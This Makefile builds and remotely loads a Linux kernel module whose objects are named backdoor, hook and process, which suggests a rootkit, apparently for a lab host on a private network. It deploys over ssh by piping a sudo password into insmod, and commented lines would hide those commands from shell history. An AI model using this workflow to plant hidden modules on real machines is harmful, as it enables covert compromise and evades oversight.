ucas-y := main.o module.o backdoor.o hook.o process.o data.o
obj-m += ucas.o
PWD := $(CURDIR)
EXTRA_CFLAGS += -g -O0
PASSWORD = ${sudo_password}

.PHONY: module clean install uninstall

all: module

module:
	$(MAKE) -C /lib/modules/5.10.140/build M=$(PWD) modules

clean:
	$(MAKE) -C /lib/modules/5.10.140/build M=$(PWD) clean

install:
	scp ucas.ko black@192.168.145.133:/home/black/
	#export HISTIGNORE='*sudo -S*'
	ssh black@192.168.145.133 'echo $(PASSWORD) | sudo -S insmod /home/black/ucas.ko'

uninstall:
	#export HISTIGNORE='*sudo -S*'
	ssh black@192.168.145.133 'echo $(PASSWORD) | sudo -S rmmod ucas'
